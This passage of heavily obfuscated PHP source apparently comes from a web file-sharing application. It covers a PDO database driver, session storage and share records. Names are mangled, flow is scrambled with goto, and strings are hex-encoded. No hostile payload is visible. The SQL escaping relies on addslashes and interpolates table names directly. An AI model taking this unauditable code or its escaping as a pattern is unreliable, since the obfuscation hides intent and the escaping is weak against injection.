think_status($AöêëĞÎÜ[20]); $this->PDOStatement = $this->_linkID->prepare($c Õ²„ÚÍ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto f¨ìÂ Á; B÷¬å°ØÒª: if ($this->dbType == $AöêëĞÎÜ[829]) { if (preg_match($AöêëĞÎÜ[837], $this->queryStr, $A‰ŒÀÚ—”Ş)) { $this->table = think_config($AöêëĞÎÜ[838]) . str_ireplace(think_config($AöêëĞÎÜ[839]), $AöêëĞÎÜ[358], $A‰ŒÀÚ—”Ş[2]); $fˆÅÍê¿¤ = (bool) $this->query($AöêëĞÎÜ[840] . strtoupper($this->table) . $AöêëĞÎÜ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($AöêëĞÎÜ[21], 1); goto Dƒ…Ãßóà‘; f¨ìÂ Á: $eÚÜŒôï¹š = $this->PDOStatement->execute($aØê­ÃËƒ); $this->debug(); if (!1 === $eÚÜŒôï¹š) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($fˆÅÍê¿¤ || preg_match($AöêëĞÎÜ[841], $c Õ²„ÚÍ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto E—Ô»´¯Ã; fÓ£Œ©: $this->queryStr = $c Õ²„ÚÍ; if (!empty($aØê­ÃËƒ)) { $this->queryStr .= $AöêëĞÎÜ[835] . print_r($aØê­ÃËƒ, !0) . $AöêëĞÎÜ[836]; } $fˆÅÍê¿¤ = !1; goto B÷¬å°ØÒª; c´×«¬‚›: $AöêëĞÎÜ =& $_SERVER[ì‹É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fÓ£Œ©; E—Ô»´¯Ã: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d¾äÎš…¿ = $this->_linkID->commit(); $this->transTimes = 0; if (!$d¾äÎš…¿) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fÁŒ—ËÉ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$fÁŒ—ËÉ) { $this->error(); return !1; } } return !0; } private function getAll() { $bƒÅ‡˜¿äÚ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($bƒÅ‡˜¿äÚ); return $bƒÅ‡˜¿äÚ; } public function getFields($F¸ÆƒíÂœ) { goto aõª‚èçÔ¢; c¢Ø«å¬: return $eÆ…Ã‹ç¾; goto aíˆ÷Î£·; aõª‚èçÔ¢: $câÄàÑˆ  =& $_SERVER[ì‹É]; $this->initConnect(!0); if (think_config($câÄàÑˆ [842])) { $dîÈ¨¥šÓ = str_replace($câÄàÑˆ [843], $F¸ÆƒíÂœ, think_config($câÄàÑˆ [842])); } else { switch ($this->dbType) { case $câÄàÑˆ [826]: case $câÄàÑˆ [844]: $dîÈ¨¥šÓ = "\123\105\x4c\105\103\124\x20\x20\x20\143\157\154\165\155\x6e\x5f\156\x61\155\x65\x20\141\163\40\x27\116\141\155\145\47\x2c\x20\40\40\144\x61\x74\x61\x5f\164\171\x70\x65\x20\141\x73\40\47\124\171\160\x65\47\x2c\40\x20\x20\143\157\154\x75\x6d\156\137\144\145\146\x61\165\154\164\x20\141\x73\40\x27\x44\x65\x66\x61\x75\154\x74\x27\54\x20\40\40\x69\x73\137\156\x75\x6c\154\x61\142\x6c\x65\40\x61\x73\40\x27\116\x75\154\x6c\47\xa\11\11\106\122\x4f\115\x9\151\156\x66\x6f\x72\155\x61\164\x69\157\x6e\137\x73\x63\x68\145\155\141\56\164\141\x62\154\x65\x73\40\x41\123\40\164\xa\11\11\x4a\x4f\111\116\11\x69\x6e\146\x6f\x72\155\141\164\x69\x6f\x6e\137\x73\143\x68\x65\155\x61\x2e\143\157\x6c\165\155\x6e\x73\40\101\123\x20\143\xa\x9\11\x4f\116\40\x20\x74\x2e\164\141\x62\x6c\145\137\143\x61\x74\x61\154\157\147\40\75\40\143\x2e\x74\141\142\x6c\x65\137\x63\141\x74\141\x6c\x6f\147\12\11\11\101\116\104\40\164\56\164\141\x62\x6c\145\137\163\143\x68\145\155\x61\40\x3d\40\143\56\164\141\x62\x6c\145\x5f\x73\143\150\x65\x6d\141\12\11\11\x41\x4e\104\40\164\56\x74\141\142\154\x65\137\156\x61\155\145\x20\75\40\143\56\x74\x61\142\x6c\x65\x5f\156\141\155\145\12\x9\x9\x57\110\105\122\x45\x20\x20\x20\x74\56\x74\x61\142\x6c\x65\x5f\x6e\x61\x6d\145\x20\75\x20\47{$F¸ÆƒíÂœ}\47"; break; case $câÄàÑˆ [845]: $dîÈ¨¥šÓ = $câÄàÑˆ [846] . $F¸ÆƒíÂœ . $câÄàÑˆ [847]; break; case $câÄàÑˆ [827]: case $câÄàÑˆ [829]: $dîÈ¨¥šÓ = $câÄàÑˆ [848] . $câÄàÑˆ [849] . $câÄàÑˆ [850] . strtoupper($F¸ÆƒíÂœ) . $câÄàÑˆ [851] . strtoupper($F¸ÆƒíÂœ) . $câÄàÑˆ [852]; break; case $câÄàÑˆ [853]: $dîÈ¨¥šÓ = $câÄàÑˆ [854] . $F¸ÆƒíÂœ . $câÄàÑˆ [855]; break; case $câÄàÑˆ [828]: break; case $câÄàÑˆ [856]: default: $dîÈ¨¥šÓ = $câÄàÑˆ [857] . ($this->dbType == $câÄàÑˆ [856] ? "\140{$F¸ÆƒíÂœ}\x60" : $F¸ÆƒíÂœ); } } goto C…š‰ê‚¹„; C…š‰ê‚¹„: $BÌƒé‡ÖÖ = $this->query($dîÈ¨¥šÓ); $eÆ…Ã‹ç¾ = array(); if ($BÌƒé‡ÖÖ) { foreach ($BÌƒé‡ÖÖ as $CÊ‰œØ¥¬ => $F³•ôÌ½Øƒ) { $F³•ôÌ½Øƒ = array_change_key_case($F³•ôÌ½Øƒ); $F³•ôÌ½Øƒ[$câÄàÑˆ [28]] = isset($F³•ôÌ½Øƒ[$câÄàÑˆ [28]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [28]] : $câÄàÑˆ [358]; $F³•ôÌ½Øƒ[$câÄàÑˆ [29]] = isset($F³•ôÌ½Øƒ[$câÄàÑˆ [29]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [29]] : $câÄàÑˆ [358]; $BŒ£¾òôì­ = isset($F³•ôÌ½Øƒ[$câÄàÑˆ [258]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [258]] : $F³•ôÌ½Øƒ[$câÄàÑˆ [28]]; $eÆ…Ã‹ç¾[$BŒ£¾òôì­] = array($câÄàÑˆ [28] => $BŒ£¾òôì­, $câÄàÑˆ [29] => $F³•ôÌ½Øƒ[$câÄàÑˆ [29]], $câÄàÑˆ [31] => (bool) (isset($F³•ôÌ½Øƒ[$câÄàÑˆ [102]]) && $F³•ôÌ½Øƒ[$câÄàÑˆ [102]] === $câÄàÑˆ [33] || isset($F³•ôÌ½Øƒ[$câÄàÑˆ [31]]) && $F³•ôÌ½Øƒ[$câÄàÑˆ [31]] === $câÄàÑˆ [33]), $câÄàÑˆ [34] => isset($F³•ôÌ½Øƒ[$câÄàÑˆ [34]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [34]] : (isset($F³•ôÌ½Øƒ[$câÄàÑˆ [53]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [53]] : $câÄàÑˆ [358]), $câÄàÑˆ [36] => isset($F³•ôÌ½Øƒ[$câÄàÑˆ [90]]) ? strtolower($F³•ôÌ½Øƒ[$câÄàÑˆ [90]]) == $câÄàÑˆ [38] : (isset($F³•ôÌ½Øƒ[$câÄàÑˆ [54]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [54]] : !1), $câÄàÑˆ [39] => isset($F³•ôÌ½Øƒ[$câÄàÑˆ [858]]) ? strtolower($F³•ôÌ½Øƒ[$câÄàÑˆ [858]]) == $câÄàÑˆ [41] : (isset($F³•ôÌ½Øƒ[$câÄàÑˆ [90]]) ? $F³•ôÌ½Øƒ[$câÄàÑˆ [90]] : !1)); } } goto c¢Ø«å¬; aíˆ÷Î£·: } public function getTables($Eâ×±ÃáÕ = '') { $Aôî¨­ØÂ™ =& $_SERVER[ì‹É]; if (think_config($Aôî¨­ØÂ™[859])) { $eæ‘àÌ½‘Ê = str_replace($Aôî¨­ØÂ™[860], $Eâ×±ÃáÕ, think_config($Aôî¨­ØÂ™[859])); } else { switch ($this->dbType) { case $Aôî¨­ØÂ™[827]: case $Aôî¨­ØÂ™[829]: $eæ‘àÌ½‘Ê = $Aôî¨­ØÂ™[861]; break; case $Aôî¨­ØÂ™[826]: case $Aôî¨­ØÂ™[844]: $eæ‘àÌ½‘Ê = $Aôî¨­ØÂ™[862]; break; case $Aôî¨­ØÂ™[853]: $eæ‘àÌ½‘Ê = $Aôî¨­ØÂ™[863]; break; case $Aôî¨­ØÂ™[828]: think_exception(think_lang($Aôî¨­ØÂ™[864]) . $Aôî¨­ØÂ™[865]); break; case $Aôî¨­ØÂ™[845]: $eæ‘àÌ½‘Ê = $Aôî¨­ØÂ™[42] . $Aôî¨­ØÂ™[43] . $Aôî¨­ØÂ™[44]; break; case $Aôî¨­ØÂ™[856]: default: if (!empty($Eâ×±ÃáÕ)) { $eæ‘àÌ½‘Ê = $Aôî¨­ØÂ™[808] . $Eâ×±ÃáÕ; } else { $eæ‘àÌ½‘Ê = $Aôî¨­ØÂ™[809]; } } } $cÓ‘­ÜÌœĞ = $this->query($eæ‘àÌ½‘Ê); $F»ƒ»ÏŒ¾Œ = array(); foreach ($cÓ‘­ÜÌœĞ as $D×”é ¦õ => $døµã“Àññ) { $F»ƒ»ÏŒ¾Œ[$D×”é ¦õ] = current($døµã“Àññ); } return $F»ƒ»ÏŒ¾Œ; } protected function parseLimit($A‡Š ö¥ù™) { $CãŠİ‘·ä =& $_SERVER[ì‹É]; $c•¯ñ‡â Ï = $CãŠİ‘·ä[33]; if (!empty($A‡Š ö¥ù™)) { switch ($this->dbType) { case $CãŠİ‘·ä[853]: case $CãŠİ‘·ä[845]: $A‡Š ö¥ù™ = explode($CãŠİ‘·ä[47], $A‡Š ö¥ù™); if (count($A‡Š ö¥ù™) > 1) { $c•¯ñ‡â Ï .= $CãŠİ‘·ä[48] . $A‡Š ö¥ù™[1] . $CãŠİ‘·ä[49] . $A‡Š ö¥ù™[0] . $CãŠİ‘·ä[50]; } else { $c•¯ñ‡â Ï .= $CãŠİ‘·ä[48] . $A‡Š ö¥ù™[0] . $CãŠİ‘·ä[50]; } break; case $CãŠİ‘·ä[826]: case $CãŠİ‘·ä[844]: break; case $CãŠİ‘·ä[828]: break; case $CãŠİ‘·ä[827]: case $CãŠİ‘·ä[829]: break; case $CãŠİ‘·ä[856]: default: $c•¯ñ‡â Ï .= $CãŠİ‘·ä[48] . $A‡Š ö¥ù™ . $CãŠİ‘·ä[50]; } } return $c•¯ñ‡â Ï; } public function parseKey(&$b¾¨¶Ú Û, $a¼é¥±Ø­ = true) { $b¤‰æâ×™Û =& $_SERVER[ì‹É]; if ($a¼é¥±Ø­) { $b¾¨¶Ú Û = $this->parseKeyCheck($b¾¨¶Ú Û); } if ($this->dbType == $b¤‰æâ×™Û[856]) { if ($b¾¨¶Ú Û != $b¤‰æâ×™Û[173] && !preg_match($b¤‰æâ×™Û[819], $b¾¨¶Ú Û)) { $b¾¨¶Ú Û = $b¤‰æâ×™Û[820] . trim($b¾¨¶Ú Û, $b¤‰æâ×™Û[820]) . $b¤‰æâ×™Û[820]; } return $b¾¨¶Ú Û; } else { return parent::parseKey($b¾¨¶Ú Û); } } public function close() { $this->_linkID = null; } public function error() { $bˆóÔÍ¬óÌ =& $_SERVER[ì‹É]; if ($this->PDOStatement) { $a¬ƒ¡ËÌóå = $this->PDOStatement->errorInfo(); $this->error = $a¬ƒ¡ËÌóå[1] . $bˆóÔÍ¬óÌ[4] . $a¬ƒ¡ËÌóå[2]; } else { $this->error = $bˆóÔÍ¬óÌ[33]; } if ($bˆóÔÍ¬óÌ[33] != $this->queryStr) { $this->error .= LNG($bˆóÔÍ¬óÌ[45]) . $this->queryStr; } think_trace($this->error, $bˆóÔÍ¬óÌ[33], $bˆóÔÍ¬óÌ[46]); return $this->error; } public function escapeString($aè˜µ»ŸÎš) { $Eš¦Ã®ÙÎ =& $_SERVER[ì‹É]; switch ($this->dbType) { case $Eš¦Ã®ÙÎ[853]: case $Eš¦Ã®ÙÎ[826]: case $Eš¦Ã®ÙÎ[844]: case $Eš¦Ã®ÙÎ[856]: return addslashes($aè˜µ»ŸÎš); case $Eš¦Ã®ÙÎ[828]: case $Eš¦Ã®ÙÎ[845]: case $Eš¦Ã®ÙÎ[827]: case $Eš¦Ã®ÙÎ[829]: return str_ireplace($Eš¦Ã®ÙÎ[55], $Eš¦Ã®ÙÎ[56], $aè˜µ»ŸÎš); } } protected function parseValue($AÇ»õËåÖ) { $e°é›ø‚Õ» =& $_SERVER[ì‹É]; if (is_string($AÇ»õËåÖ)) { $AÇ»õËåÖ = strpos($AÇ»õËåÖ, $e°é›ø‚Õ»[4]) === 0 ? $this->escapeString($AÇ»õËåÖ) : $e°é›ø‚Õ»[866] . $this->escapeString($AÇ»õËåÖ) . $e°é›ø‚Õ»[866]; } elseif (isset($AÇ»õËåÖ[0]) && is_string($AÇ»õËåÖ[0]) && strtolower($AÇ»õËåÖ[0]) == $e°é›ø‚Õ»[282]) { $AÇ»õËåÖ = $this->escapeString($AÇ»õËåÖ[1]); } elseif (is_array($AÇ»õËåÖ)) { $AÇ»õËåÖ = array_map(array($this, $e°é›ø‚Õ»[867]), $AÇ»õËåÖ); } elseif (is_bool($AÇ»õËåÖ)) { $AÇ»õËåÖ = $AÇ»õËåÖ ? $e°é›ø‚Õ»[84] : $e°é›ø‚Õ»[464]; } elseif (is_null($AÇ»õËåÖ)) { $AÇ»õËåÖ = $e°é›ø‚Õ»[102]; } return $AÇ»õËåÖ; } public function getLastInsertId() { $eòŠÂïÙô =& $_SERVER[ì‹É]; switch ($this->dbType) { case $eòŠÂïÙô[853]: case $eòŠÂïÙô[845]: case $eòŠÂïÙô[826]: case $eòŠÂïÙô[844]: case $eòŠÂïÙô[828]: case $eòŠÂïÙô[856]: return $this->_linkID->lastInsertId(); case $eòŠÂïÙô[827]: case $eòŠÂïÙô[829]: $d®Ú˜â¦ñŠ = $this->table; $eÊ£îŸÆ»Ş = $this->query("\x53\x45\114\x45\x43\124\x20{$d®Ú˜â¦ñŠ}\x2e\x63\165\162\162\x76\x61\154\40\x63\165\162\x72\x76\x61\154\40\x46\122\x4f\115\x20\x64\x75\x61\x6c"); return $eÊ£îŸÆ»Ş ? $eÊ£îŸÆ»Ş[0][$eòŠÂïÙô[868]] : 0; } } } goto FöÎ«™°Œè; CÚŞÚô¾ÆÍ: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\x6d\x5f\163\145\x73\x73\151\157\x6e"; public function get($C¡Æ‚óï) { $bÙãíŠÁ¨ =& $_SERVER[ì‹É]; $a˜‰µ½ÙÆÏ = $this->where(array($bÙãíŠÁ¨[2117] => $C¡Æ‚óï))->find(); if (!is_array($a˜‰µ½ÙÆÏ)) { return !1; } return $a˜‰µ½ÙÆÏ[$bÙãíŠÁ¨[679]]; } public function set($Fª‰ƒ¦»ø, $f…é–Ã„›’, $C›‰Œº­ã¢ = 3600) { $aºêÏã¡¡´ =& $_SERVER[ì‹É]; $b°§¯ŒÃ = array($aºêÏã¡¡´[2117] => $Fª‰ƒ¦»ø, $aºêÏã¡¡´[2045] => $f…é–Ã„›’, $aºêÏã¡¡´[2118] => $C›‰Œº­ã¢ + time()); if (Session::get($aºêÏã¡¡´[2119])) { $b°§¯ŒÃ[$aºêÏã¡¡´[1351]] = Session::get($aºêÏã¡¡´[2119]); } else { $b°§¯ŒÃ[$aºêÏã¡¡´[1351]] = 0; } if ($this->get($Fª‰ƒ¦»ø)) { return $this->where(array($aºêÏã¡¡´[2117] => $Fª‰ƒ¦»ø))->save($b°§¯ŒÃ); } else { return $this->add($b°§¯ŒÃ, array(), !0); } } public function remove($B¤¢‘—†Ãá) { return $this->where(array($_SERVER[ì‹É][2117] => $B¤¢‘—†Ãá))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ì‹É][2120] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\157\144\151\x66\x79\124\x69\155\145", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\x74\54\165\x70\144\141\x74\x65", "\146\165\x6e\143\164\151\157\x6e"), array("\x63\162\x65\x61\x74\145\124\x69\155\145", "\x74\151\x6d\x65", "\151\156\x73\x65\x72\x74", "\x66\165\156\143\164\151\x6f\156"), array("\157\160\x74\x69\157\x6e\163", '', "\151\x6e\x73\145\162\164\54\165\x70\144\141\164\x65\54\163\x65\x6c\x65\x63\164", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($E‡×ößŞàŞ) { $c’†œĞí×« =& $_SERVER[ì‹É]; $b÷¢©Æ ­ã = isset($E‡×ößŞàŞ[0]) ? $E‡×ößŞàŞ[0] : !1; return array($c’†œĞí×«[2121] => array(USER_ID, $c’†œĞí×«[2122]), $c’†œĞí×«[2083] => array($b÷¢©Æ ­ã, $c’†œĞí×«[2123])); } protected function listSimple() { $EÒî÷ã¦¼ù = array($_SERVER[ì‹É][1351] => USER_ID); $fŞì®ë±È³ = $this->field($this->fieldList)->where($EÒî÷ã¦¼ù)->select(); return $fŞì®ë±È³ ? $fŞì®ë±È³ : array(); } protected function getInfo($Fæ‰ãÕÖôÉ, $AÅğèèÇ©È = false) { $DÃ¡ÏùëãŠ =& $_SERVER[ì‹É]; if ($AÅğèèÇ©È) { return $this->_getShareInfo(array($DÃ¡ÏùëãŠ[437] => $Fæ‰ãÕÖôÉ)); } $EîÛÄ¼•Íß = $this->cacheFunctionGet($DÃ¡ÏùëãŠ[2124], $Fæ‰ãÕÖôÉ); return $EîÛÄ¼•Íß; } public function getInfoByHash($bèÖ ‘ß¹‡) { return $this->_getShareInfo(array($_SERVER[ì‹É][439] => $bèÖ ‘ß¹‡)); } public function getInfoByPath($F‰ÌªÛ†ÖÖ) { $cÊÖ¢åÍµä =& $_SERVER[ì‹É]; $BÓßÁ‚Ù…Ê = array($cÊÖ¢åÍµä[1351] => USER_ID, $cÊÖ¢åÍµä[366] => $F‰ÌªÛ†ÖÖ); return $this->_getShareInfo($BÓßÁ‚Ù…Ê); } public function getInfoBySourcePath($Cæ¨„‚”ñ) { $AŠµùç‡†Ç =& $_SERVER[ì‹É]; $e„¨Éàáƒê = array($AŠµùç‡†Ç[1351] => USER_ID, $AŠµùç‡†Ç[991] => $Cæ¨„‚”ñ); return $this->_getShareInfo($e„¨Éàáƒê); } private function _getShareInfo($e…é¼˜¸ï½) { goto fÀçœ³ğÀñ; fÀçœ³ğÀñ: $e‘åˆà°ïø =& $_SERVER[ì‹É]; $D˜÷¶Üï„’ = $this->where($e…é¼˜¸ï½)->find(); if (!$D˜÷¶Üï„’) { return !1; } goto F÷Ó¬åÙ ²; F÷Ó¬åÙ ²: $e…é¼˜¸ï½ = array($e‘åˆà°ïø[437] => $D˜÷¶Üï„’[$e‘åˆà°ïø[437]]); $bóí‹»æ¾µ = $e‘åˆà°ïø[2125]; $EÆ®•òÒ” = Model($e‘åˆà°ïø[529])->order($e‘åˆà°ïø[364])->field($bóí‹»æ¾µ)->where($e…é¼˜¸ï½)->select(); goto Eñ‡Ú“›÷¡; Eñ‡Ú“›÷¡: if ($D˜÷¶Üï„’[$e‘åˆà°ïø[366]] == $e‘åˆà°ïø[464]) { $D˜÷¶Üï„’[$e‘åˆà°ïø[388]] = IO::info($D˜÷¶Üï„’[$e‘åˆà°ïø[991]]); } else { $D˜÷¶Üï„’[$e‘åˆà°ïø[388]] = Model($e‘åˆà°ïø[1083])->pathInfo($D˜÷¶Üï„’[$e‘åˆà°ïø[366]]); } $D˜÷¶Üï„’[$e‘åˆà°ïø[2126]] = $EÆ®•òÒ”; return $D˜÷¶Üï„’; goto E Ë™ÖÜŞÉ; E Ë™ÖÜŞÉ: } protected function getInfoAuth($Díìéµ•Ğ—) { $CãÈˆ¯Ì‰„ =& $_SERVER[ì‹É]; $BŞÅ…âÂ½” = $this->getInfo($Díìéµ•Ğ—); $BŞÅ…âÂ½”[$CãÈˆ¯Ì‰„[373]] = Model($CãÈˆ¯Ì‰„[450])->authMake($BŞÅ…âÂ½”[$CãÈˆ¯Ì‰„[2126]]); return $BŞÅ…âÂ½”; } protected function listData($eÚÕØæ×ˆ = null, $dã‰¯ï•à› = 300) { $FêøŞÊ– =& $_SERVER[ì‹É]; $Aç Ü±¥¤ = array(array($FêøŞÊ–[442] => array($FêøŞÊ–[923], 0), $FêøŞÊ–[444] => array($FêøŞÊ–[923], 0), $FêøŞÊ–[2127] => $FêøŞÊ–[2096])); if ($eÚÕØæ×ˆ == $FêøŞÊ–[1781]) { $Aç Ü±¥¤ = array($FêøŞÊ–[442] => 1); } else { if ($eÚÕØæ×ˆ == $FêøŞÊ–[980]) { $Aç Ü±¥¤ = array($FêøŞÊ–[444] => 1); } } $Aç Ü±¥¤[$FêøŞÊ–[1351]] = USER_ID; $D§Šë†™ôì = $this->where($Aç Ü±¥¤)->selectPage($dã‰¯ï•à›); return $D§Šë†™ôì; } protected function listToMe($A„Ì¦–ßñ¥ = 300) { goto fÈï£ö™Æï; d–ŸÉô™Ëİ: $FÏ¯Œİ™¶Ú = array($F‹ó¤âÇ©[513] => SourceModel::TYPE_USER, $F‹ó¤âÇ©[452] => USER_ID); if ($C²ç³â‰´ç) { $FÏ¯Œİ™¶Ú = array(array($F‹ó¤âÇ©[513] => SourceModel::TYPE_USER, $F‹ó¤âÇ©[452] => USER_ID), array($F‹ó¤âÇ©[513] => SourceModel::TYPE_GROUP, $F‹ó¤âÇ©[452] => array($F‹ó¤âÇ©[7], $C²ç³â‰´ç)), $F‹ó¤âÇ©[2127] => $F‹ó¤âÇ©[2096]); } $dÇ‡ÃÛÎ›ƒ = Model($F‹ó¤âÇ©[529])->where($FÏ¯Œİ™¶Ú)->selectPage($A„Ì¦–ßñ¥); goto cïÂá¬±ï¯; fÈï£ö™Æï: $F‹ó¤âÇ© =& $_SERVER[ì‹É]; $A‘°Óõ£ = Session::get($F‹ó¤âÇ©[2128]); $C²ç³â‰´ç = array_to_keyvalue($A‘°Óõ£, $F‹ó¤âÇ©[33], $F‹ó¤âÇ©[2014]); goto d–ŸÉô™Ëİ; aŒá¸ÇÂ: $a‹¦¥Õ“æò = array($F‹ó¤âÇ©[2130] => $Eğéëâöö, $F‹ó¤âÇ©[2131] => $dÇ‡ÃÛÎ›ƒ[$F‹ó¤âÇ©[347]]); return $a‹¦¥Õ“æò; goto AĞìŸøë‰; A‡ù´í¬Ğ: $FÏ¯Œİ™¶Ú = array($F‹ó¤âÇ©[437] => array($F‹ó¤âÇ©[381], array_keys($e•ãõ›íÜ))); $Eğéëâöö = $this->field($D«©Ã­˜‰ )->where($FÏ¯Œİ™¶Ú)->select(); foreach ($Eğéëâöö as $Cá´×ƒ¯Ÿì => &$b¨×âÛÎ) { $b¨×âÛÎ[$F‹ó¤âÇ©[2126]] = $e•ãõ›íÜ[$b¨×âÛÎ[$F‹ó¤âÇ©[437]]]; } goto aŒá¸ÇÂ; cïÂá¬±ï¯: $e•ãõ›íÜ = array_to_keyvalue_group($dÇ‡ÃÛÎ›ƒ[$F‹ó¤âÇ©[350]], $F‹ó¤âÇ©[437]); if (!$e•ãõ›íÜ) { return $dÇ‡ÃÛÎ›ƒ; } $D«©Ã­˜‰  = $F‹ó¤âÇ©[2129]; goto A‡ù´í¬Ğ; AĞìŸøë‰: } protected function shareAdd($Bí•®­°µÒ, $b²È·†Ä‘ö) { $A¾á¥÷Å¥İ =& $_SERVER[ì‹É]; $Déö×‡‡Íê = $this->_addShareData($Bí•®­°µÒ, $b²È·†Ä‘ö); if (isset($b²È·†Ä‘ö[$A¾á¥÷Å¥İ[2132]]) && count($b²È·†Ä‘ö[$A¾á¥÷Å¥İ[2132]]) > 0) { $this->_shareAuthSet($Déö×‡‡Íê, $b²È·†Ä‘ö[$A¾á¥÷Å¥İ[2132]]); } $this->shareEventAdd($Bí•®­°µÒ, $b²È·†Ä‘ö, $A¾á¥÷Å¥İ[983]); return $Déö×‡‡Íê; } private function shareEventAdd($FÓÂ¶•ªŒ, $DâÎ–ä¾¼„, $cğ¢ğêƒ›‡ = "\141\144\x64") { goto AÊ½ÉºÌ…Ñ; fÈÏâØ†î: $CĞ‘Üî„ó = $CŠ±å¢Ç›¨[2135]; if ($fÈùá›ãˆ[$CŠ±å¢Ç›¨[442]] == $CŠ±å¢Ç›¨[464] && $DâÎ–ä¾¼„[$CŠ±å¢Ç›¨[442]] == $CŠ±å¢Ç›¨[84]) { $CĞ‘Üî„ó = $CŠ±å¢Ç›¨[2133]; } if ($fÈùá›ãˆ[$CŠ±å¢Ç›¨[442]] == $CŠ±å¢Ç›¨[84] && $DâÎ–ä¾¼„[$CŠ±å¢Ç›¨[442]] == $CŠ±å¢Ç›¨[464]) { $CĞ‘Üî„ó = $CŠ±å¢Ç›¨[2136]; } goto dˆ¾ä¶ƒò¬; D±„÷”Øˆ•: return; goto aÙ’ÌÜ†ã†; dˆ¾ä¶ƒò¬: if ($fÈùá›ãˆ[$CŠ±å¢Ç›¨[444]] == $CŠ±å¢Ç›¨[464] && $DâÎ–ä¾¼„[$CŠ±å¢Ç›¨[444]] == $CŠ±å¢Ç›¨[84]) { $CĞ‘Üî„ó = $CŠ±å¢Ç›¨[2134]; } if ($fÈùá›ãˆ[$CŠ±å¢Ç›¨[444]] == $CŠ±å¢Ç›¨[84] && $DâÎ–ä¾¼„[$CŠ±å¢Ç›¨[444]] == $CŠ±å¢Ç›¨[464]) { $CĞ‘Üî„ó = $CŠ±å¢Ç›¨[2137]; } Model($CŠ±å¢Ç›¨[497])->eventShare($FÓÂ¶•ªŒ, $CĞ‘Üî„ó); goto D±„÷”Øˆ•; AÊ½ÉºÌ…Ñ: $CŠ±å¢Ç›¨ =& $_SERVER[ì‹É]; if ($cğ¢ğêƒ›‡ == $CŠ±å¢Ç›¨[983]) { if ($DâÎ–ä¾¼„[$CŠ±å¢Ç›¨[442]] == $CŠ±å¢Ç›¨[84]) { Model($CŠ±å¢Ç›¨[497])->eventShare($FÓÂ¶•ªŒ, $CŠ±å¢Ç›¨[2133]); } if ($DâÎ–ä¾¼„[$CŠ±å¢Ç›¨[444]] == $CŠ±å¢Ç›¨[84]) { Model($CŠ±å¢Ç›¨[497])->eventShare($FÓÂ¶•ªŒ, $CŠ±å¢Ç›¨[2134]); } return; } $fÈùá›ãˆ = $this->getInfoByPath($FÓÂ¶•ªŒ); goto fÈÏâØ†î; aÙ’ÌÜ†ã†: } private function _addShareData($D…ì£â Ê‡, $B¾™ÇæÚÚ = array()) { goto fëçÇ¦Òƒ; d¹ÔÕá…¿¤: $dÒ›¤©âÉ° = $this->add($Fâø…Õ‹ì); $B¤ùëè‘Ñô = array($FìáŸÁ£¢[439] => short_id($dÒ›¤©âÉ°)); $this->where(array($FìáŸÁ£¢[436] => $dÒ›¤©âÉ°))->save($B¤ùëè‘Ñô); goto C¦¸½†ëÚÆ; fëçÇ¦Òƒ: $FìáŸÁ£¢ =& $_SERVER[ì‹É]; $eÛëˆÎÖ± = array($FìáŸÁ£¢[380] => $D…ì£â Ê‡, $FìáŸÁ£¢[1342] => USER_ID); if ($D…ì£â Ê‡ == 0) { $eÛëˆÎÖ± = array($FìáŸÁ£¢[2138] => $B¾™ÇæÚÚ[$FìáŸÁ£¢[991]], $FìáŸÁ£¢[1342] => USER_ID); } goto E É¸â×ŠØ; E É¸â×ŠØ: if ($EíçÊÕŒ’ = $this->where($eÛëˆÎÖ±)->find()) { return $EíçÊÕŒ’[$FìáŸÁ£¢[437]]; } if ($D…ì£â Ê‡ == 0) { $D£õ®’ÜÏÂ = array($FìáŸÁ£¢[28] => get_path_this($B¾™ÇæÚÚ[$FìáŸÁ£¢[76]])); } else { $D£õ®’ÜÏÂ = Model($FìáŸÁ£¢[757])->sourceInfo($D…ì£â Ê‡); if (!$D£õ®’ÜÏÂ) { return !1; } } if (!$B¾™ÇæÚÚ[$FìáŸÁ£¢[1248]]) { $B¾™ÇæÚÚ[$FìáŸÁ£¢[1248]] = $D£õ®’ÜÏÂ[$FìáŸÁ£¢[28]]; } goto DªïÅ˜é‚ä; C¦¸½†ëÚÆ: return $dÒ›¤©âÉ°; goto aİ½ƒ†‹à; DªïÅ˜é‚ä: $Fâø…Õ‹ì = array($FìáŸÁ£¢[1342] => USER_ID, $FìáŸÁ£¢[380] => $D…ì£â Ê‡, $FìáŸÁ£¢[1248] => $FìáŸÁ£¢[33], $FìáŸÁ£¢[442] => 0, $FìáŸÁ£¢[444] => 0, $FìáŸÁ£¢[991] => $FìáŸÁ£¢[33], $FìáŸÁ£¢[292] => $FìáŸÁ£¢[33], $FìáŸÁ£¢[798] => $FìáŸÁ£¢[33], $FìáŸÁ£¢[2139] => 0, $FìáŸÁ£¢[2140] => 0, $FìáŸÁ£¢[690] => 0, $FìáŸÁ£¢[2141] => $FìáŸÁ£¢[33], $FìáŸÁ£¢[439] => $FìáŸÁ£¢[33]); $bÆ¶²­Ğ§µ = explode($FìáŸÁ£¢[47], $FìáŸÁ£¢[2142]); foreach ($bÆ¶²­Ğ§µ as $BâËŠ˜ƒÀ“) { if (!isset($B¾™ÇæÚÚ[$BâËŠ˜ƒÀ“])) { continue; } 